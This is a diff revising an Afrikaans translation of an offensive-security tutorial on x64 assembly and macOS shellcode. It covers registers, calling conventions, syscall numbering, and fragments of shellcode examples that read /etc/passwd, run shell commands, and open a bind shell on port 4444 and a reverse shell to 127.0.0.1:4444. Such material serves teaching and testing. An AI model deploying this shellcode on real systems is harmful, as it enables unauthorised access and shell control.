@@ -4,72 +4,72 @@
 
 ## **Inleiding tot x64**
 
-x64, ook bekend as x86-64, is 'n 64-bis verwerker argitektuur wat hoofsaaklik in desktop en bediener rekenaars gebruik word. Dit het ontstaan uit die x86 argitektuur wat deur Intel vervaardig is en later deur AMD met die naam AMD64 aangeneem is, en dit is die heersende argitektuur in persoonlike rekenaars en bedieners vandag.
+x64, ook bekend as x86-64, is ’n 64-bis-verwerkerargitektuur wat hoofsaaklik in rekenaar- en bedienerverwerking gebruik word. Dit het uit die x86-argitektuur ontstaan wat deur Intel vervaardig is en later deur AMD aangeneem is onder die naam AMD64. Dit is vandag die algemene argitektuur in persoonlike rekenaars en bedieners.
 
 ### **Registers**
 
-x64 brei op die x86 argitektuur uit, met **16 algemene registers** gemerk as `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, en `r8` tot `r15`. Elke een van hierdie kan 'n **64-bis** (8-byte) waarde stoor. Hierdie registers het ook 32-bis, 16-bis, en 8-bis sub-registers vir kompatibiliteit en spesifieke take.
+x64 brei op die x86-argitektuur uit en bevat **16 algemene-doel-registers** met die benamings `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, en `r8` tot `r15`. Elkeen hiervan kan ’n **64-bis** (8-grepe) waarde stoor. Hierdie registers het ook 32-bis-, 16-bis- en 8-bis-subregisters vir versoenbaarheid en spesifieke take.
 
 1. **`rax`** - Tradisioneel gebruik vir **terugkeerwaardes** van funksies.
-2. **`rbx`** - Gereeld gebruik as 'n **basisregister** vir geheue operasies.
-3. **`rcx`** - Gewoonlik gebruik vir **lus tellers**.
-4. **`rdx`** - Gebruik in verskeie rolle insluitend uitgebreide aritmetiese operasies.
-5. **`rbp`** - **Basisaanwyser** vir die stapelraam.
-6. **`rsp`** - **Stapelaanwyser**, wat die bokant van die stapel dop hou.
-7. **`rsi`** en **`rdi`** - Gebruik vir **bron** en **bestemming** indekse in string/geheue operasies.
-8. **`r8`** tot **`r15`** - Bykomende algemene registers wat in x64 bekendgestel is.
+2. **`rbx`** - Dikwels gebruik as ’n **basisregister** vir geheuebewerkings.
+3. **`rcx`** - Gewoonlik gebruik vir **lus-tellers**.
+4. **`rdx`** - Gebruik in verskeie rolle, insluitend uitgebreide rekenkundige bewerkings.
+5. **`rbp`** - **Basiswyser** vir die stack frame.
+6. **`rsp`** - **Stack-wyser**, wat die bokant van die stack naspoor.
+7. **`rsi`** en **`rdi`** - Gebruik vir **bron-** en **bestemmingsindekse** in string-/geheuebewerkings.
+8. **`r8`** tot **`r15`** - Bykomende algemene-doel-registers wat in x64 bekendgestel is.
 
-### **Aanroep Konvensie**
+### **Calling Convention**
 
-Die x64 aanroep konvensie verskil tussen bedryfstelsels. Byvoorbeeld:
+Die x64 calling convention verskil tussen bedryfstelsels. Byvoorbeeld:
 
-- **Windows**: Die eerste **vier parameters** word in die registers **`rcx`**, **`rdx`**, **`r8`**, en **`r9`** oorgedra. Verdere parameters word op die stapel geplaas. Die terugkeerwaarde is in **`rax`**.
-- **System V (gewoonlik gebruik in UNIX-agtige stelsels)**: Die eerste **ses heelgetal of aanwyser parameters** word in registers **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, en **`r9`** oorgedra. Die terugkeerwaarde is ook in **`rax`**.
+- **Windows**: Die eerste **vier parameters** word in die registers **`rcx`**, **`rdx`**, **`r8`**, en **`r9`** deurgegee. Verdere parameters word op die stack gepush. Die terugkeerwaarde is in **`rax`**.
+- **System V (algemeen gebruik in UNIX-agtige stelsels)**: Die eerste **ses heelgetal- of wyserparameters** word in die registers **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, en **`r9`** deurgegee. Die terugkeerwaarde is ook in **`rax`**.
 
-As die funksie meer as ses invoere het, sal die **oorige op die stapel oorgedra word**. **RSP**, die stapelaanwyser, moet **16 bytes uitgelijnd** wees, wat beteken dat die adres waarheen dit wys, deelbaar moet wees deur 16 voordat enige aanroep plaasvind. Dit beteken dat ons normaalweg moet verseker dat RSP behoorlik uitgelijnd is in ons shellcode voordat ons 'n funksie aanroep. In praktyk werk stelselaanroepe egter baie keer selfs al word hierdie vereiste nie nagekom nie.
+As die funksie meer as ses insette het, sal die **res op die stack deurgegee word**. **RSP**, die stack-wyser, moet **16 grepe belyn** wees, wat beteken dat die adres waarna dit wys, deur 16 deelbaar moet wees voordat enige call plaasvind. Dit beteken dat ons normaalweg moet verseker dat RSP behoorlik in ons shellcode belyn is voordat ons ’n funksie-call maak. In die praktyk werk system calls egter baie keer selfs wanneer daar nie aan hierdie vereiste voldoen word nie.
 
-### Aanroep Konvensie in Swift
+### Calling Convention in Swift
 
-Swift het sy eie **aanroep konvensie** wat gevind kan word in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)
+Swift het sy eie **calling convention**, wat in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64) gevind kan word.
 
 ### **Algemene Instruksies**
 
-x64 instruksies het 'n ryk stel, wat kompatibiliteit met vroeëre x86 instruksies handhaaf en nuwe bekendstel.
+x64-instruksies het ’n uitgebreide stel, wat versoenbaarheid met vorige x86-instruksies behou en nuwes bekendstel.
 
-- **`mov`**: **Beweeg** 'n waarde van een **register** of **geheue ligging** na 'n ander.
-- Voorbeeld: `mov rax, rbx` — Beweeg die waarde van `rbx` na `rax`.
-- **`push`** en **`pop`**: Druk of pop waardes na/vanaf die **stapel**.
-- Voorbeeld: `push rax` — Druk die waarde in `rax` op die stapel.
-- Voorbeeld: `pop rax` — Pop die boonste waarde van die stapel in `rax`.
-- **`add`** en **`sub`**: **Optelling** en **aftrekking** operasies.
-- Voorbeeld: `add rax, rcx` — Voeg die waardes in `rax` en `rcx` by en stoor die resultaat in `rax`.
-- **`mul`** en **`div`**: **Vermenigvuldiging** en **deling** operasies. Let op: hierdie het spesifieke gedrag rakende operand gebruik.
-- **`call`** en **`ret`**: Gebruik om **aan te roep** en **terug te keer van funksies**.
-- **`int`**: Gebruik om 'n sagteware **onderbreking** te aktiveer. Byvoorbeeld, `int 0x80` is gebruik vir stelselaanroepe in 32-bis x86 Linux.
+- **`mov`**: **Skuif** ’n waarde van een **register** of **geheue-ligging** na ’n ander.
+- Voorbeeld: `mov rax, rbx` — Skuif die waarde van `rbx` na `rax`.
+- **`push`** en **`pop`**: Push of pop waardes na/van die **stack**.
+- Voorbeeld: `push rax` — Push die waarde in `rax` op die stack.
+- Voorbeeld: `pop rax` — Pop die boonste waarde van die stack na `rax`.
+- **`add`** en **`sub`**: **Optel-** en **aftrekbewerkings**.
+- Voorbeeld: `add rax, rcx` — Tel die waardes in `rax` en `rcx` bymekaar en stoor die resultaat in `rax`.
+- **`mul`** en **`div`**: **Vermenigvuldigings-** en **delingsbewerkings**. Let wel: hierdie het spesifieke gedrag rakende operandgebruik.
+- **`call`** en **`ret`**: Gebruik om **funksies aan te roep** en **daaruit terug te keer**.
+- **`int`**: Gebruik om ’n sagteware-**interrupt** te aktiveer. Byvoorbeeld, `int 0x80` is vir system calls in 32-bis x86 Linux gebruik.
 - **`cmp`**: **Vergelyk** twee waardes en stel die CPU se vlae op grond van die resultaat.
 - Voorbeeld: `cmp rax, rdx` — Vergelyk `rax` met `rdx`.
-- **`je`, `jne`, `jl`, `jge`, ...**: **Voorwaardelike sprong** instruksies wat die beheerstroom verander op grond van die resultate van 'n vorige `cmp` of toets.
-- Voorbeeld: Na 'n `cmp rax, rdx` instruksie, `je label` — Spring na `label` as `rax` gelyk is aan `rdx`.
-- **`syscall`**: Gebruik vir **stelselaanroepe** in sommige x64 stelsels (soos moderne Unix).
-- **`sysenter`**: 'n Geoptimaliseerde **stelselaanroep** instruksie op sommige platforms.
+- **`je`, `jne`, `jl`, `jge`, ...**: **Voorwaardelike jump**-instruksies wat die control flow verander op grond van die resultate van ’n vorige `cmp` of test.
+- Voorbeeld: Ná ’n `cmp rax, rdx`-instruksie, `je label` — Spring na `label` as `rax` gelyk is aan `rdx`.
+- **`syscall`**: Gebruik vir **system calls** in sommige x64-stelsels (soos moderne Unix).
+- **`sysenter`**: ’n Geoptimaliseerde **system call**-instruksie op sommige platforms.
 
-### **Funksie Proloog**
+### **Funksieproloog**
 
-1. **Druk die ou basisaanwyser**: `push rbp` (stoor die oproeper se basisaanwyser)
-2. **Beweeg die huidige stapelaanwyser na die basisaanwyser**: `mov rbp, rsp` (stel die nuwe basisaanwyser op vir die huidige funksie)
-3. **Toekenning van ruimte op die stapel vir plaaslike veranderlikes**: `sub rsp, <size>` (waar `<size>` die aantal bytes is wat benodig word)
+1. **Push die ou basiswyser**: `push rbp` (stoor die caller se basiswyser)
+2. **Skuif die huidige stack-wyser na die basiswyser**: `mov rbp, rsp` (stel die nuwe basiswyser vir die huidige funksie op)
+3. **Ken spasie op die stack toe vir plaaslike veranderlikes**: `sub rsp, <size>` (waar `<size>` die aantal grepe is wat benodig word)
 
-### **Funksie Epiloog**
+### **Funksie-epiloog**
 
-1. **Beweeg die huidige basisaanwyser na die stapelaanwyser**: `mov rsp, rbp` (deallocate plaaslike veranderlikes)
-2. **Pop die ou basisaanwyser van die stapel af**: `pop rbp` (herstel die oproeper se basisaanwyser)
-3. **Terugkeer**: `ret` (gee beheer terug aan die oproeper)
+1. **Skuif die huidige basiswyser na die stack-wyser**: `mov rsp, rbp` (deallokeer plaaslike veranderlikes)
+2. **Pop die ou basiswyser van die stack af**: `pop rbp` (herstel die caller se basiswyser)
+3. **Keer terug**: `ret` (gee beheer aan die caller terug)
 
 ## macOS
 
 ### syscalls
 
-Daar is verskillende klasse van syscalls, jy kan [**dit hier vind**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
+Daar is verskillende klasse syscalls; jy kan [**dit hier vind**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -78,7 +78,7 @@ Daar is verskillende klasse van syscalls, jy kan [**dit hier vind**](https://ope
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
-Dan kan jy elke syscall nommer [**in hierdie URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
+Dan kan jy elke syscall-nommer [**in hierdie URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -95,18 +95,18 @@ Dan kan jy elke syscall nommer [**in hierdie URL**](https://opensource.apple.com
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
-So om die `open` syscall (**5**) van die **Unix/BSD klas** aan te roep, moet jy dit byvoeg: `0x2000000`
+Dus, om die `open`-syscall (**5**) vanuit die **Unix/BSD class** aan te roep, moet jy dit byvoeg: `0x2000000`
 
-So, die syscall nommer om open aan te roep, sal `0x2000005` wees
+Die syscall-nommer om open aan te roep, sal dus `0x2000005` wees
 
 ### Shellcodes
 
-Om te kompileer:
+Om te compileer:
 ```bash
 nasm -f macho64 shell.asm -o shell.o
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
 ```
-Om die bytes te onttrek:
+Om die grepe te onttrek:
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
 for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
@@ -118,7 +118,7 @@ otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g'
 ```
 <details>
 
-<summary>C kode om die shellcode te toets</summary>
+<summary>C-kode om die shellcode te toets</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -168,7 +168,7 @@ return 0;
 
 #### Shell
 
-Geneem uit [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) en verduidelik. 
+Geneem van [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) en verduidelik.<sup>[1]</sup>
 
 {{#tabs}}
 {{#tab name="with adr"}}
@@ -188,7 +188,7 @@ syscall
 ```
 {{#endtab}}
 
-{{#tab name="met stap"}}
+{{#tab name="with stack"}}
 ```armasm
 bits 64
 global _main
@@ -209,7 +209,7 @@ syscall
 
 #### Lees met cat
 
-Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, so die tweede argument (x1) is 'n array van parameters (wat in geheue 'n stapel van die adresse beteken).
+Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, dus is die tweede argument (x1) 'n array van parameters (wat in memory beteken dat dit 'n stack van adresse is).
 ```armasm
 bits 64
 section .text
@@ -240,7 +240,7 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-#### Roep opdrag met sh
+#### Voer opdrag uit met sh
 ```armasm
 bits 64
 section .text
@@ -280,7 +280,7 @@ touch_command:  db "touch /tmp/lalala", 0
 ```
 #### Bind shell
 
-Bind shell van [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) in **poort 4444**
+Bind shell vanaf [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) op **poort 4444**<sup>[2]</sup>.
 ```armasm
 section .text
 global _main
@@ -357,7 +357,7 @@ syscall
 ```
 #### Reverse Shell
 
-Reverse shell van [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell na **127.0.0.1:4444**
+Reverse shell vanaf [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell na **127.0.0.1:4444**<sup>[3]</sup>.
 ```armasm
 section .text
 global _main
@@ -419,4 +419,10 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
+## Verwysings
+
+- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
+- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
+- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)
+
 {{#include ../../../banners/hacktricks-training.md}}
